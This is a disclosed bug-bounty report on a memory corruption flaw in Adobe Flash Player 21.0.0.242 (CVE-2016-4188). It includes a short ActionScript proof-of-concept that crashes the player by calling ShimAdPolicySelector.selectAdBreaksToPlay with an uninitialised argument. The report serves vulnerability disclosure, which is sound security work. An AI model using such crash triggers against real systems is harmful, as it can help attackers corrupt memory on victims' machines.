# Adobe Flash Player ShimAdPolicySelector(adPolicySelectorType=0) class Memory Corruption

## Report Details
- **Report ID**: 151040
- **URL**: https://hackerone.com/reports/151040
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-07-13T02:47:16.953Z
- **Disclosed**: 2019-11-12T09:42:05.083Z

## Reporter
- **Username**: hhj4ck
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
I. Summary
Adobe Flash Player is prone to a vulnerability which leads to memory corruption because of improper validation of ShimAdPolicySelector.selectAdBreaksToPlay().
------------------------------------------------------------------
II. Description
Normally, selectAdBreaksToPlay() should validate its parameter returns error in AS3 level if anything goes wrong.
However, if ShimAdPolicySelector is constructed with adPolicySelectorType=0, then invoking selectAdBreaksToPlay() with invalid AdPolicyInfo instance, some inner fields of ShimAdPolicySelector will be absent, which will cause a memory crash.

POC Source Code:

package
{	
	import com.adobe.tvsdk.mediacore.MediaPlayerItem;
	import com.adobe.tvsdk.mediacore.timeline.advertising.policy.AdPolicyInfo;
	import com.adobe.tvsdk.mediacore.timeline.advertising.policy.ShimAdPolicySelector;	
	import flash.display.Sprite;

	public class poc extends Sprite
	{
		public function poc()
		{
			var mp:MediaPlayerItem;
			var ap:AdPolicyInfo;
			var obj:ShimAdPolicySelector = new ShimAdPolicySelector(0,mp);
			obj.selectAdBreaksToPlay(ap);
		}		
	}
}
------------------------------------------------------------------
III. Impact
Memory Corruption
------------------------------------------------------------------
IV. Affected
Adobe Flash Player 21.0.0.242.
------------------------------------------------------------------
V. Credit
Wen Guanxing from Pangu LAB is credited for this vulnerability.

It has been assigned as CVE-2016-4188 by Adobe:
https://helpx.adobe.com/security/products/flash-player/apsb16-25.html

## Attachments
- poc.swf
